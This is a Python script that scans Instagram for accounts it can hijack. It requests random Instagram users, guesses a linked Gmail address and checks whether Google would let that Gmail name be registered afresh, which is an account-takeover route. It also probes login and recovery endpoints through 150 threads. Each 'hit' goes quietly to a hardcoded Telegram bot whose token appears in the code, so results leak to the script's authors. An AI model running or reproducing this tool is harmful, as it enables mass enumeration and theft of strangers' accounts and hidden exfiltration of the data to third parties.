import os
import requests
from user_agent import generate_user_agent
import time
from time import sleep as nini
from random import randrange, choice
import random
from requests import get
import sys
from time import time
from threading import Thread
from datetime import datetime

def check_date():
    current_date = datetime.now().date()  
    target_date = datetime(2024, 12,28 ).date()

    if current_date >= target_date:
        print("\n - New file in Telegram -> @jockertoolz")
        exit()


check_date()
t = 'https://t.me/jockertoolz'
qqq = 'https://t.me/jockerpy'
import webbrowser as o
from pyfiglet import Figlet as FF
RED = "\033[1;31m"
GREEN = "\033[1;32m"
WHITE = "\033[1;37m"
BX = random.randint(5,208)
RCOLOR = f'\x1b[38;5;{BX}m'
BAD_E = 0
BAD_I = 0
hit = 0
ABC=FF(font='poison')
DED=ABC.renderText(f"Harsh")
o.open(t)
nini(2)
o.open(qqq)
print(DED)
AI = "6658831303"
AT = "7207949833:AAEx9UQ_2a3s5AlRDBXi--YhaZ9WRkkCO0E"
os.system('clear')
ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
port = random.choice(pl)
proxy = ip + ":" + str(port)
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import re
yy='azertyuiopmlkjhgfdsqwxcvbn'
ids=[]
def tll():
  try:
    n1=''.join(cc(yy)for i in range(rr(6,9)))
    n2=''.join(cc(yy)for i in range(rr(3,9)))
    host=''.join(cc(yy)for i in range(rr(15,30)))
    he3 = {
      "accept": "*/*",
      "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
      "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
      "google-accounts-xsrf": "1",
      "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
      "sec-ch-ua-arch": "\"\"",
      "sec-ch-ua-bitness": "\"\"",
      "sec-ch-ua-full-version": "\"116.0.5845.72\"",
      "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
      "sec-ch-ua-mobile": "?1",
      "sec-ch-ua-model": "\"ANY-LX2\"",
      "sec-ch-ua-platform": "\"Android\"",
      "sec-ch-ua-platform-version": "\"13.0.0\"",
      "sec-ch-ua-wow64": "?0",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
      "x-client-data": "CJjbygE=",
      "x-same-domain": "1",
      "Referrer-Policy": "strict-origin-when-cross-origin",
    'user-agent': str(gg()),
    }
    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
    tok= re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
    cookies={
      '__Host-GAPS':host
    }
    headers = {
      'authority': 'accounts.google.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'google-accounts-xsrf': '1',
      'origin': 'https://accounts.google.com',
      'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
      'user-agent': gg(),
  }
    data = {
    'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
  }
    response = pp(
      'https://accounts.google.com/_/signup/validatepersonaldetails',
      cookies=cookies,
      headers=headers,
      data=data,
      proxies={'http://': proxy}
  )
    tl=str(response.text).split('",null,"')[1].split('"')[0]
    host=response.cookies.get_dict()['__Host-GAPS']
    try:os.remove('tl.txt')
    except:pass
    with open('tl.txt','a') as f:
      f.write(tl+'//'+host+'\n')
  except Exception as e:
    print(e)
    tll()
tll()
def check_gmail(email):
  if '@' in email:
    email = str(email).split('@')[0]
  try:
    try:
      o=open('tl.txt','r').read().splitlines()[0]
    except:
      tll()
      o=open('tl.txt','r').read().splitlines()[0]
    tl,host = o.split('//')
    cookies = {
    '__Host-GAPS': host
  }
    headers = {
    'authority': 'accounts.google.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'google-accounts-xsrf': '1',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
    'user-agent': gg(),
  }
    params = {
    'TL': tl,
  }
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = pp(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
    proxies={'http://': proxy}
  )
    if '"gf.uar",1' in str(response.text):return 'good'
    elif '"er",null,null,null,null,400' in str(response.text):
      tll()
      check_gmail(email)
    else:return 'bad'
  except:check_gmail(email)
#====by jockerpy
os.system('clear')
def rest(user):
  try:
    headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
    data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
    'ig_sig_key_version': '4',
  }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
    r=response['email']
  except:
    r='no REST'
  return r
def email():
    while True:
        try:
            lsd = ''.join(choice('eQ6xuzk5X8j6_fGvb0gJrc') for _ in range(16))
            id = str(randrange(1, 21254029834))
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/0s9s/',
                'user-agent': str(generate_user_agent()),
                'x-fb-lsd': 'jocker' + lsd,
            }
            data = {
                'lsd': 'jocker' + lsd,
                'variables': '{"id":"' + id + '","relay_header":false,"render_surface":"PROFILE"}',
                'doc_id': '7397388303713986',
            }
            username = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data, proxies={'http://': proxy}).json()['data']['user']['username']
            email=username+'@gmail.com'
            check(email)
        except:''
from threading import Thread
for _ in range(150):
  Thread(target=email).start()
def gmail(email):
  global BAD_E
  try:
    if 'good' == check_gmail(email):
        username,jj=email.split('@')
        info(username,jj)
    else:BAD_E+=1
  except:''
def check(email):
  global BAD_I,BAD_E
  headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': 'csrftoken=M7Z3UAnjhvCItM0dlORT1F; mid=Zn_vnQALAAFfSpgyz15t03J3E0bT; ig_did=8858D267-430C-4953-B520-42C09128595A; datr=ne9_ZiG-4SiXhJkPqOO951Sm; ig_nrcb=1; ps_l=1; ps_n=1; wd=479x613',
    'origin': 'https://www.instagram.com',
    'priority': 'u=1, i',
    'referer': 'https://www.instagram.com/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.127", "Google Chrome";v="126.0.6478.127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.6 Mobile/15E148 Safari/604.1',
    'x-asbd-id': '129477',
    'x-csrftoken': 'M7Z3UAnjhvCItM0dlORT1F',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': '1014710806',
    'x-requested-with': 'XMLHttpRequest',
}
  f1=str(time()).split('.')[0]
  data = {
    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{f1}:f1f1ioo',
    'optIntoOneTap': 'false',
    'queryParams': '{}',
    'trustedDeviceRecords': '{}',
    'username': f'{email}',
}
  response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',headers=headers, data=data).text
  if '"showAccountRecoveryModal":true' in response:gmail(email)
  else:BAD_I+=1
  sys.stdout.write(f'''\r{GREEN}OK -> {hit} {WHITE}EMAIL -> {BAD_E} {RED}GEN -> {BAD_I} DEV -> @jockerpy \r''')
check(email)
from rich.panel import Panel
from rich import print
def info(username,jj):
  global hit
  hit+=1
  try:
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9',
    'origin': 'https://storiesig.info',
    'priority': 'u=1, i',
    'referer': 'https://storiesig.info/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
    rrr = requests.get(f'https://api-ig.storiesig.info/api/userInfoByUsername/{username}', headers=headers).json()
    Id = rrr['result']['user']['pk']
    fows = rrr['result']['user']['follower_count']
    fowg = rrr['result']['user']['following_count']
    fuull = rrr['result']['user']['full_name']
    prr = rrr['result']['user']['is_private']
    pp = rrr['result']['user']['media_count']
    try:
      api = 'https://r3xwc.pythonanywhere.com/'
      params = {'id':Id}
      response = requests.get(api,params=params).json()
      date=response['date']
    except:
      date='none'
    TTT = f'𝐉𝐚𝐜𝐤𝐞𝐫 𝐗 𝐍𝐨𝐛𝐢𝐭𝐚 \n NAME : {fuull}\n EMAIL : {username}@{jj}\n FOLLOWERS : {fows}\n FOLLOWING : {fowg}\n POST : {pp}\n ID : {Id}\n DATE : {date}\n Reset : {rest(username)}\n\n@jockerpy @nobi4t11| @jockertoolz '
    print(Panel(f'{TTT}',title='NEW HIT', style='cyan'))
    with open('Hit.txt','a') as ff:
      ff.write(f'{TTT}\n')
    try:requests.get(f"https://api.telegram.org/bot{AT}/sendMessage?chat_id={AI}&text={TTT}")
    except:pass
  except:
    TTT = f'𝐉𝐚𝐜𝐤𝐞𝐫 𝐗 𝐍𝐨𝐛𝐢𝐭𝐚 \n USERNAME : {username}\n EMAIL : {username}@{jj}\n REST : {rest(username)}\n\n@jockerpy | @jockertoolz '
    print(Panel(f'{TTT}',title='NEW HIT', style='cyan'))
    try:requests.get(f"https://api.telegram.org/bot{AT}/sendMessage?chat_id={AI}&text={TTT}")
    except:pass
    with open('Hit.txt','a') as ff:
      ff.write(f'{TTT}\n')